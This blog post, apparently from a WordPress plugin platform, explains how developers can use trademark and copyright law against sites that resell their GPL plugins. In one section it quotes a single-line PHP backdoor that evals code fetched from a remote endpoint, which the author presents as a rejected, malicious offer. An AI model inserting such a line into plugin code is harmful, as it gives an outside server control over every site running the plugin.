Software licensing can be very confusing subject, especially in the open-source world. Boundaries of legality and ethics aren’t always clear. But as business owners focused on selling WordPress GPL plugins, it’s our duty to understand these topics thoroughly.

This post will not address ethics and will focus on the legal considerations. It will provide you a step-by-step actionable formula, including feedback from experienced attorneys in this space, to protect your WordPress business against plugin ‘trolls.’

As a plugin developer for the past five years, I’ve read tons of articles discussing the GPL, its freedoms, and the challenges associated with running a GPL-compliant business. But in the last few months, this topic has become even more significant for me.

In August, a Twitter account named WordPress Plugins (https://twitter.com/plugswp) followed me. As a matter of habit, I checked their profile to learn more about that user. I soon discovered that the handler was associated with ‘wppluginscheap.com,’ a plugins & themes ‘troll’ that touts itself as “the number 1 source for Cheap Premium WordPress Plugins and Themes.” Browsing the site, I found many popular premium plugins like Yoast SEO, Backup Buddy, WP Robot, and 50 premium themes. **Each product sold for less than $10.**

![Cheap WordPress Plugins](https://freemius.com/blog/wp-content/uploads/2016/01/cheap-wordpress-plugins.jpg)

Naive as I was, I hopped on WPChat and started a [new thread](https://wpchat.com/t/wordpress-plugins-cheap-plugins-themes-re-selling-and-gpl/):

> We’ve been all coding under the threat that some troll will pop-up and re-sell our GPL plugins / themes for ridiculous prices. Well… it’s here How about buying Yoast Premium SEO for $4.00… I’m a little pissed off and on the other hand amused since I knew it will show up some day.

![WPChat WordPress Plugin Resell GPL](https://freemius.com/blog/wp-content/uploads/2016/01/wpchat-plugin-resell-gpl.jpg)

**I asked the community two questions:**  
1\. How do we get it taken down?  
2\. Do you feel threatened?

In parallel, I went to Advanced WordPress Facebook group, and uploaded the following status:

> Joost de Valk and Thomas Höfter unless you guys started to sell your plugins for under $10, I think these guys violate your trademarks (and dozen of other plugin developers). How do we get it down?

![Advanced WordPress Plugin Trolls Thread](https://freemius.com/blog/wp-content/uploads/2016/01/awp-plugin-trolls.jpg)  
If you are a member of the AWP group, you can check the whole [thread here](https://www.facebook.com/groups/advancedwp/permalink/995427107186170/).

Both of the threads generated a lot of interest and discussion. I received 17 replies in WPChat and 84 comments in the AWP Facebook group. Once the replies started to pile up, I realized two things:  
1\. WordPress plugin / theme trolls are an epidemic – it’s happening everywhere!

> This has been happening for a LONG time, although mostly with themes and WooCommerce addons. See gplclub.org and sozot.com. WPAvengers.com did something similar before they shut down.
> 
> – Leland Fiegel, Founder of WPChat

2\. Even though there are hundreds of blog posts about every aspect of the GPL license, there’s still a lot of confusion in the ecosystem. Even among influencers. It seems like many people think it’s technically OK (albeit unethical) to do it since plugins and themes are licensed under the GPL.

> These opportunists pop up every now and then and never seem to amount to anything. It’s legal (the GPL part, anyway) but unethical. It’s lazy. And it’s bad for the customers because the goods are in questionable shape, outdated, unsupported and suspicious.
> 
> – Steven Gliebe, Theme Developer and Founder of Pro Plugin Directory

> It is unethical, however if me as a theme/plugin shop owner releasing under GPL I would say that, I feel that I am even more unethical if I can say this than those guys, and a total hypocrite.
> 
> – Ionut Neagu, Founder of CodeinWP

Other comments received on Facebook included:

- *If the plugins were licensed under GPL, then I’m afraid that they can’t do anything*
- *I don’t think the premium versions are under GPL*
- *It’s legal, under the GPL*

And there are much more of those!

So before we start, let me clear something —

**This is completely wrong!**

### Developers still have enforceable rights even if their plugins are distributed under an open source license. These ‘Plugin Trolls’ may still be liable for trademark infringement and/or copyright infringement.

I want to add that I’ve read plenty of opinions saying that no harm is done to the business by those trolls. If that was the case, I wouldn’t bother spending so much time compiling this post. I would like to take the opportunity to explain the reasons why trolls are bad for the WordPress community – for your business and also for WordPress users.

## Why are plugin trolls bad for your plugins business?

### Lost Revenues

Whether you like it or not, a chunk of users will purchase or get your premium plugin from this websites. Especially WordPress newbies. If I was new to the WordPress ecosystem and looking for an SEO plugin, Yoast SEO for $4 sounds way more appealing than the full price. I would just buy it. Just like I always search for the best discount when I’m purchasing a smartphone or other products. I don’t need the “original warranty” since I never used it with any of the products I purchased, so support is not something that users have in mind right from the start.

### Support Abuse

If there are any problems with the plugin purchased from the troll – guess who is blamed for that? Of course the real developer/company. If the artwork associated with your brand is replicated, customers will contact you. Just like if I purchased an HTC smartphone on Amazon, when I have issues with the device I call HTC technical support, not Amazon. What would you tell the user? “Yes, it’s our phone, but you need to contact Amazon for technical support.” This response would be hard for a user to digest It will look like you are not standing behind your products.

### Brand Damage

There is no question that some trolls inject malicious code into the plugins. The main incentive to do this is to generate revenues while distributing the premium plugins for free. I’ve witnessed this myself. Two years ago, I was approached by a senior SEO guy from a BIG U.K. based agency (over 100 employees). . He offered to partner with me by adding one simple line of code to our plugin:  
`eval(wp_remote_get( 'http://www.company.com/path/to/api/endpoint/' )[‘body’]);`

The idea was that the API endpoint will return hidden URLs to push their portfolio companies’ backlinks. One of the examples he sent was:

`<a href="”http://www.portfolio-company.com”">Great Company</a>`

This was before Google Penguin and was a great SEO hack. And the offer was also fantastic – $0.1 per domain per month. So if I had 100,000 active domains using my plugin, I could generate $10,000 / mo. revenues without spending an extra minute. Awesome right? Obviously we didn’t do it, for various reasons, primarily because this code was EXTREMELY malicious. It opens a remote backdoor to do anything you want with the site. Even if the agency was only intended to use it for SEO, what happens if their server is hacked and someone with bad intentions takes control? Who knows how many legitimate WordPress.org plugins did partner with that agency… Getting back to the trolls, their intentions are purely financial. They don’t promote your premium plugins for fun, they want to make money. And if they do illegal stuff like copyright and trademark infringement, nothing stops them from generating alternative revenue streams like code injections. Oh, and I forgot to mention that if something like that happens you are the one to be blamed! It’s your product, and your brand.

## Grab a free copy of our Cheat Sheet for Selling Plugins and Themes

A growth roadmap with concise, actionable tips for every milestone of WordPress product development.

![blue book with the title “Cheat Sheet for Selling Themes and Plugins by Freemius” written on it](https://freemius.com/blog/wp-content/plugins/fsblog-utilities/assets/img/svg/cheat-sheet-ebook.svg)

## Why are plugin trolls bad for users?

For many of the same reasons I mentioned, but from the user’s perspective.

### No Support

When facing a technical issue, the troll just can’t help you out. It’s not their product, they have no clue about the code or how to solve any related problems. Moreover, they don’t have the support resources to do it. And if you’ll try to contact the original company, premium plugin developers have the infrastructure to keep track of their customers. The company often won’t help you until you purchase an original license.

### No Automated Updates

Most premium plugins on the market today have a licensing and updates mechanism (trolls often ‘hack’ this part before redistributing the plugin). The way this automatic updates mechanism works is that once in every 24 hours, the plugin checks the original company’s server to see if there are any updates for the premium version. It also authenticates with a license key. Since the troll’s plugin was never issued with a license key from the original company, this updates mechanism will NOT work. Therefore, every time a non-original premium plugin is installed, there are no automatic updates. This is bad since hackers are constantly finding new creative vulnerabilities and an outdated premium plugin could be that security leak.

### Major Security Leaks

Remember the malicious one line of code I mentioned above? Would you like to have a backdoor to your site open to hackers? This backdoor literally enables a hacker to modify every pixel and piece of content on your site. And that’s only one example, I’m sure there are many other creative injections out there.

## What do open source licenses cover?

Since there’s clearly a lot of confusion about these issues in the developer community, I reached out to my friend, [Ariel Reinitz](https://www.linkedin.com/in/ariel-reinitz-9149b53) and his colleague [Matthew Hintz](https://www.linkedin.com/in/mphintz) who are Intellectual Property (IP) (patents, trademarks, and copyrights) attorneys at [Lowenstein Sandler LLP](https://twitter.com/LowensteinLLP), a nationwide firm with offices from New York to Palo Alto.

Ariel explained to me that while WP plugin ‘trolls’ may technically be entitled to redistribute code that is under an open source license (e.g., GPL), **there are other intellectual property (‘IP’) rights that are not covered under the open source license which these ‘trolls’ may still be infringing.**

![Ariel Reinitz](https://freemius.com/blog/wp-content/uploads/2016/01/ariel-reinitz-profilepic-150x150.jpg)

Ariel Reinitz, Intellectual Property Attorney

Here’s what Ariel has to say about the GPL:

*It’s important to understand what the open source license (GPLv2) under which most WordPress plugins are distributed, does (and doesn’t) cover:*

*An open-source license dictates how software/source code is to be distributed. Generally, such licenses allow anyone to use, modify, etc., the software/code at no cost. Thus, the source code of an open source project can be redistributed by other parties without violating the terms of the GPL.*

In simple words – the GPL freedom allows anyone to take the source code and do whatever he wants with it, including distribution. I believe that there’s a consensus on that part in the community.

## What don’t open source licenses cover?

*However, open-source licenses (including the GPLv2) do not generally extend to trademarks. Trademarks pertain to the manner in which a product (e.g., a plugin, theme, app, etc.) is branded – e.g., the name of the product (and/or the company from which it originates), its tagline/slogan, and/or its logo. Thus, while the source code of a project may be freely redistributable under an open source license, such a license does not grant others any rights with respect to the trademarks associated with the project (e.g., the product’s name, the company that developed it, etc.).*

In non-lawyer words – the GPL doesn’t allow to use any of the plugin’s trademark like the product’s name, company name, and logo. Ariel gives us an example:

*So, for example, if a third party redistributes a WordPress plugin using all of the project’s original branding (e.g., promoting it with the original name, logo, etc., of the company/project), this would likely infringe the original developer’s trademark rights. As noted, the open source license does not allow someone to use someone else’s branding in a commercial context. This is important because one of the main principles of trademark law is to protect the consumer from confusion as to where a product is coming from.*

The main principles of trademark law is not only to protect the business, it’s there to protect the consumer from confusion as to where a product is coming from. That’s important note!

*It’s also important to recognize that many open-source companies register, protect, and police their trademark rights. Examples include:* [*Linux*](http://tmsearch.uspto.gov/bin/showfield?f=doc&state=4810%3A5dye6k.4.15)*,* [*MySQL*](http://tmsearch.uspto.gov/bin/showfield?f=doc&state=4810%3A5dye6k.5.1)*,* [*Red Hat*](http://tmsearch.uspto.gov/bin/showfield?f=doc&state=4810%3A5dye6k.6.18)*, and* [*WordPress*](http://tmsearch.uspto.gov/bin/showfield?f=doc&state=4810%3A5dye6k.7.4)*.*

What Ariel is saying here is that many of the biggest names in open-source protect and police their trademark rights. **Why shouldn’t we do the same?**

In addition to trademark rights, Ariel pointed out that developers are also entitled to copyright protection on materials they produce which are not part of the source code:

*It’s also important to recognize that the GPL (and other open-source licenses) only cover the source code of the plugin itself. But, if the developer creates materials that aren’t part of the source code (e.g., graphics, promotional materials, packaging, etc.), those materials wouldn’t fall under the GPL and the developer would have no obligation to allow another party to redistribute the materials.*

For example, take a look at how the ‘Yoast’ plugin is featured in some of the ‘troll’ sites referenced above. While those sites may technically be able to redistribute Yoast’s source code (as it falls under the GPL), these sites also incorporate elements such as Yoast’s branding (e.g., Yoast’s name and logo, which are trademarks) as well as other creative materials developed by Yoast (e.g., the graphic of the guy drinking tea which is not part of Yoast’s source code and thus the copyright is owned by Yoast and not subject to the GPL).

So – while the troll may be legally entitled to redistribute Yoast’s source code, the GPL (or another open source license) **does not give them the right to use (a) Yoast’s branding (trademarks) or (b) other graphics, materials, etc., (copyrights)**. Since they’re not part of the plugin’s source code, these items do not fall under the GPL and therefore **the intellectual property (IP) rights to these items are the sole property of the developer**.

Since the plugin ‘trolls’ are using the developer’s trademarks and copyrighted materials (like in the ‘Yoast’ examples above), there are legal procedures (as we’ll explore in detail below) that developers can use to enforce these rights in order to stop, dissuade, or at least attempt to limit the impact these ‘trolls’ can have on your business. Again, this is true even though your plugin is distributed under the GPL.

## What is protected by trademarks?

![Matthew Hintz](https://freemius.com/blog/wp-content/uploads/2016/01/matthew-hintz-profilepic-150x150.jpg)

Matthew Hintz, Intellectual Property Attorney

Matthew explains what trademarks cover:

*Simply put, a trademark is a unique identifier to consumers that distinguishes the source of goods or services from others. Most often, a trademark is a word, logo, or some combination of those elements. In the United States, trademark rights begin with use in commerce (called “common law rights”), not through registration with the United States Patent & Trademark Office (USPTO). However, registration of your trademark with the USPTO provides the owner many benefits not available through common law rights. Notably, these include evidence of the registrant’s exclusive right to use a mark throughout the United States in connection with the goods or services set out in the registration, constructive notice that the registrant is the owner of the trademark, listing of the registration in the USPTO’s online database, and ability to use the ® symbol. (Prior to registration, a TM symbol can be used with a trademark.)*

### Is code protected by a trademark?

During my research, I read a few posts mentioning that when forking a GPL licensed plugin or a theme, the code must be refactored to make sure there are no functions that include the trademarked identifier as part of the function name. To clarify that, I asked Matthew if code is also protected by the trademark, and here’s the answer:

***Code itself is not protected by trademark.**Trademarks protect the word or logo that a consumer associates with your goods or services. A limit to trademark protection for a plugin then would be to the word or logo used to market the plugin to consumers. And then the fundamental test for trademark infringement is whether consumers would likely be confused by the similarity of the two marks. Similarity is assessed by looking at things like visual and phonetic similarity, how closely related the goods/services for each mark are, how distinctive the marks are, and how long the marks have been used.*

To clarify the answer in a developer-friendly language:

- Class names, function names, variables names and constant names are NOT protected by trademark.
- On the other hand, strings that are printed onto the page and visible to the end users – are protected by trademark.

## How to file a trademark registration?

*To obtain the benefits of the federal registration of a trademark, your trademark must be registered with the USPTO. An application to register must include basic information: name of the applicant/owner, the mark, the goods or services that the mark is used with, evidence of use of the mark with those goods or services, and dates of first use of that mark. Considerations for your application:*

- *Search the USPTO’s TESS (http://www.uspto.gov/trademark ) database for same or similar marks. If same or similar marks are applied for or already registered, these can be the basis for a rejection of your application. Also search via Google or other search services since a mark could be used without registration and have superior rights in that mark despite your registration. Registration does not exhaust a prior user’s trademark rights.*
- *For describing your goods or services, search the USPTO’s ID Manual for acceptable language:* [*http://tess2.uspto.gov/netahtml/tidm.html*](http://tess2.uspto.gov/netahtml/tidm.html)*. You can also search for acceptable language on TESS.*
- *Classes are general indications relating to certain fields for goods or services. For example, downloadable plugins are usually in Class 9 which covers all computer programs and software.*
- *The fees for a trademark application are determined by the number of classes. The general fee is $275 per class, but lesser and more expensive filing options are available.*

*After an application is filed, the USPTO will examine the application to determine if the mark is a unique identifier (i.e., not descriptive or confusingly similar to prior filed applications or registrations). The USPTO provides timelines for applications:* [*http://www.uspto.gov/trademark/trademark-timelines/trademark-application-and-post-registration-process-timelines*](http://www.uspto.gov/trademark/trademark-timelines/trademark-application-and-post-registration-process-timelines)*.*

*Keep in mind that trademark protection is territorial. For example, a registration in the United States will provide trademark protection in the United States.*

As Matthew described, the process isn’t necessarily complex – but it does take time and effort. I would recommend paying a mid-level lawyer to do it for you. It should cost you between $200-$2,000 for the work, though it will save you time and ensure a better application. In any case, before you start, Google it! If you find a product or a company (particularly in the same or similar field) matching your exact term / phrase, there’s a good chance you will NOT be able to register the trademark (and you may actually being violating someone else’s’ 🙂 ).

## What to do when your trademark is infringed?

I’ll start with what you should NOT do – if it’s a trademark infringement, not a copyrights, you should NOT file a DMCA takedown.

*DMCA covers ONLY copyright infringement. No similar provision is available for trademarks. [Using DMCA takedown notices for trademark claims can result in the claimant being liable for false statements.](http://www.newyorkbusinesslitigationlawyer-blog.com/2014/07/use-of-dmca-takedown-notice-for-alleged-trademark-infringement-could-result-in-liability-for-misrepr.html)*

It is generally simplest to attempt to resolve matters directly with the website owner. If this is unsuccessful, you can initiate legal action against the website owner, host, etc. The specific approach you take will likely be case specific and at this point, I’d suggest contacting an attorney to understand the best option in your specific circumstances.

## What is protected by copyrights?

*Copyright is different than trademark. Copyright protects original works of authorship fixed in some medium of expression. However, a limit to copyright protection is that it extends only to the expression, not the idea. Categories of works for copyright protection include literary works (books, code), musical works, photographs and images, motion pictures, sound recordings, among other categories. Another limit is that copyright does not protect short phrases or expressions – that remains for trademark protection, so long as those function as unique identifier to consumers that distinguishes the source of goods or services from others.*

## What to do when your copyrights are infringed?

1. Initially, it’s often simplest to attempt to contact the website owner directly. In many cases, the website owner is no more interested than you are in enlisting lawyers, becoming involved in legal proceedings, etc. Try to find the twitter account, contact email or contact page on the site, and send a message demanding the removal of your trademarked plugin from the website.
2. If it doesn’t help, you can send a DMCA takedown notices (Digital Millennium Copyright Act). There are bunch of generators to help you create one, just [google for “dmca takedown generator”](https://www.google.com/search?q=dmca%20takedown%20generator&oq=dmca%20takedown%20generator). Once you have the notice, you’ll need to send it to the site owner, hosting company and ISP. You can optionally submit a notice to the search engines as well to remove the site from the search results. To find the hosting company you can use websites like [whoishostingthis.com](http://www.whoishostingthis.com). To find the ISP you can use websites like [http://www.whoismyisp.org/](http://www.whoismyisp.org/). To find the relevant link to file the DMCA to the ISP / Hosting, google for ISP\_NAME / HOSTING\_NAME + DMCA.

Alternatively, you can initiate legal action against the website owner, host, etc. I suggest contacting an attorney to understand whether this is or isn’t the best option in your specific circumstances.

### Conclusion

I hope this set of step-by-step instructions empowered you with the right tools to protect your GPL plugins business against trolls. Just a recap:

- As a business owner, you are eligible, and should protect your company’s brand and assets.
- Trademarks and copyrights are relatively cheap & effective ways to legally protect your plugin business. Therefore, you should strongly consider registering trademarks for your company’s name and product names.
- Many trolls infringe both copyrights (e.g., by lifting your promotional graphics) and trademarks (by using your brand name). By creating a unique brand name, logo and artwork, you generate a portfolio to help fight against copyright infringement.

If a 3rd party website lists your premium GPL plugin or theme, for sale or giveaway, without your consent:

- If the website is using your original artwork or other materials – that’s likely copyright infringement. You can file a DMCA takedown.
- If the website is using your company’s or product’s trademark, it’s likely trademark infringement. You can initiate legal proceedings against the website.

**If you have any additional thoughts about the legal and ethical implications of the GPL, feel free to share it in the comments below.**

Great references:

- [DMCA Takedown Notice Issued Against Fork Of WP Migrate DB Pro](http://wptavern.com/dmca-takedown-notice-issued-against-fork-of-wp-migrate-db-pro)
- [The GPL License Doesn’t Provide The Freedom To Infringe Registered Trademarks](http://wptavern.com/the-gpl-license-doesnt-provide-the-freedom-to-infringe-registered-trademarks)
- [Is the WordPress GPL Being Abused?](http://www.wpmayor.com/wordpress-gpl-abuse/)
- [Why Are We Paying For GPL Licensed Code?](http://wptavern.com/gpl-ethics-right-wrong-winners-losers)